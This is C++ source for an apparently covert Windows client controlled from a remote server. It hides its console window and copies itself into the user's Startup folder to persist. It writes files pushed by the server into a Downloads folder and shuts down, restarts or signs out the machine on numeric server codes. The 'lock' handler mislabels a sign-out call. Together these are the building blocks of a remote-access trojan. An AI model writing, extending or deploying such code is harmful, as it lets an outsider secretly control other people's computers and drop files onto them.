#include <winsock2.h>
#include <thread>
#include <windows.h>
#include <fstream>
#include <vector>
#include <iostream>
#include <algorithm>

void Hide() {
    AllocConsole();
    HWND win = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(win, 0);
}

int saveServerInfo(std::string ip, int port) {
    char currentPath[MAX_PATH];
    if (GetModuleFileName(NULL, currentPath, MAX_PATH) == 0) {
        std::cerr << "[!] Failed to get the executable path." << std::endl;
        return -1;
    }

    std::string string_path = std::string(currentPath); 
    size_t file_name_pos = string_path.find_last_of("\\");    
    std::string file_name = string_path.substr(file_name_pos+1, MAX_PATH);
    std::string path_only = string_path.substr(0, file_name_pos);

    std::cout << "[+] Save path: " << path_only << "\\server.info \n"; 

    std::ofstream file(path_only + "\\server.info");
    file << ip << "\n" << port << "\n";
    file.close();

    return 0; 
}


std::vector<std::string> readServerInfo() {
    char currentPath[MAX_PATH];
    if (GetModuleFileName(NULL, currentPath, MAX_PATH) == 0) {
        std::cerr << "[!] Failed to get the executable path." << std::endl;
        return {};
    }

    std::string string_path = std::string(currentPath); 
    size_t file_name_pos = string_path.find_last_of("\\");    
    std::string path_only = string_path.substr(0, file_name_pos);

    std::cout << "[=] Checking: " << path_only << "\\server.info\n";

    std::ifstream file(path_only+"\\server.info");
    if (!file.good()) {
        std::cout << "[!] No saved server credentials\n";
        file.close();
        return {};
    }

    std::string line;
    std::vector<std::string> temp;
    while (std::getline(file, line)) {
        temp.push_back(line);
    } file.close();

    return temp;
}


bool recv_all(SOCKET socket, char* buffer, size_t size) {
    size_t total_received = 0;
    while (total_received < size) {
        int received = recv(socket, buffer + total_received, size - total_received, 0);
        if (received <= 0) {
            return false;
        }
        total_received += received;
    }
    return true;
}

void ReceiveFile(SOCKET sock) {
	// 1. Receive filename length (4 bytes)
	uint32_t fname_len = 0;
	if (!recv_all(sock, (char*)&fname_len, sizeof(fname_len))) {
		std::cerr << "[!] Failed to receive filename length\n";
		return;
	}

	// 3. Receive filename
	std::string fname(fname_len, '\0');
	if (!recv_all(sock, &fname[0], fname_len)) {
		std::cerr << "[!] Failed to receive filename\n";
		return;
	} printf("[+] Filename: %s\n", fname.c_str());

	// 4. Receive file size (8 bytes)
	uint64_t file_size = 0;
	if (!recv_all(sock, (char*)&file_size, sizeof(file_size))) {
		std::cerr << "[!] Failed to receive file size\n";
		return;
	}  

    // // receive path length
    // uint64_t filePathLen = 0;
    // if (!recv_all(sock, (char*)&filePathLen, sizeof(filePathLen))) {
    //     std::cerr << "[!] Failed to receive file path length\n";
    //     return;
    // }

    // // receive path
    // std::string filePath(filePathLen, '\0');
    // if (!recv_all(sock, &filePath[0], filePathLen)) {
    //     std::cerr << "[!] Failed to receive file path\n";
    //     return;
    // }

    // std::string outputPath = filePath + "\\" + fname;
    // printf("output path: %s\n", outputPath.c_str());

	std::cout << "[+] Receiving file: " << fname << " (" << file_size << " bytes)\n";

	// 5. Open local file for writing
	std::ofstream file("C:\\users\\movements\\Downloads\\" + fname, std::ios::binary);
	if (!file.is_open()) {
		std::cerr << "[!] Failed to open local file for writing: " << fname << "\n";
		return;
	}

	// 6. Receive file content in chunks
	const size_t buffer_size = 4096;
	char buffer[buffer_size];
	uint64_t total_received = 0;

	while (total_received < file_size) {
		size_t to_read = (std::min)((uint64_t)buffer_size, file_size - total_received);
		int received = recv(sock, buffer, to_read, 0);
		if (received <= 0) {
			std::cerr << "[!] Connection lost during file transfer\n";
			file.close();
			return;
		}

		file.write(buffer, received);
		total_received += received;
	}

	file.close();
	std::cout << "[+] File " << fname << " received successfully.\n";
}

void HandleCommands(std::string command, SOCKET sock) {
	if (command == "229892") {
		std::cout << "[!] Server sent a shutdown signal.\n"; // shutdown
		send(sock, "ok", 2, 0);
		std::this_thread::sleep_for(std::chrono::seconds(2));	
        closesocket(sock);      // close before signing out
		system("shutdown /s /t 5");
	} else if (command == "893234") {
		std::cout << "[!] Server sent a restart signal.\n"; // restart
		send(sock, "ok", 2, 0);
		std::this_thread::sleep_for(std::chrono::seconds(2));	
        closesocket(sock);      // close before signing out
		system("shutdown /r");	
	} else if (command == "837453") {
		std::cout << "[!] Server sent a lock signal.\n"; // lock
		send(sock, "ok", 2, 0);
		std::this_thread::sleep_for(std::chrono::seconds(2));	
        closesocket(sock);      // close before signing out
		ExitWindowsEx(0, 0);
	} else if (command == "993123") {
        std::cout << "[!] Server is sending a file.\n";
		ReceiveFile(sock);
	}
}

void SaveOnStartUp() {
    std::cout << "[=] Saving on start up. Please wait...\n";

    char currentPath[MAX_PATH];
    if (GetModuleFileName(NULL, currentPath, MAX_PATH) == 0) {
        std::cerr << "[!] Failed to get the executable path." << std::endl;
        return;
    }

    std::cout << "[+] Current exe path: " << currentPath << '\n';

    char destinationPath[MAX_PATH];
    const char* appDataDir = getenv("APPDATA"); // Get the AppData directory
    if (appDataDir == NULL) {
        std::cerr << "[!] Failed to get AppData directory." << std::endl;
        return;
    }

    snprintf(destinationPath, MAX_PATH, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\client.exe", appDataDir);
    std::cout << "[+] Program will be saved here: " << destinationPath << '\n';

    if (CopyFile(currentPath, destinationPath, FALSE) == 0) {
        std::cerr << "[!] Failed to copy the file. Error: " << GetLastError() << std::endl;
        return;
    }

    std::cout << "[+] Executable saved to: " << destinationPath << "\n\n";
    return ;
}